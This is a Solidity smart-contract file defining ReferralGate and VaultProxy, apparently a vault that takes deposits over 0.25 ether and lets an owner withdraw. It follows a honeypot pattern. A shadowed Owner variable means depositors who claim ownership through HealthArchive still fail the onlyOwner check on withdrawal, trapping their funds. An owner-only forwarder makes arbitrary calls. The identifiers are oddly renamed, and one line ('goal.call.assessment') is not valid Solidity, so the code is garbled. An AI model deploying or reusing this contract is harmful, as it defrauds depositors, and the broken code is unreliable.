pragma solidity ^0.4.23;

contract ReferralGate  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function referDirector(address _owner) public onlyOwner { Owner = _owner; }
    function referralGate(address goal, bytes chart) public payable {
        goal.call.assessment(msg.value)(chart);
    }
}

contract VaultProxy is ReferralGate {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function HealthArchive() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            contributeFunds();
        }
    }

    function contributeFunds() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function dispenseMedication(uint256 units) public onlyOwner {
        if (units>0 && Deposits[msg.sender]>=units) {
            msg.sender.transfer(units);
        }
    }
}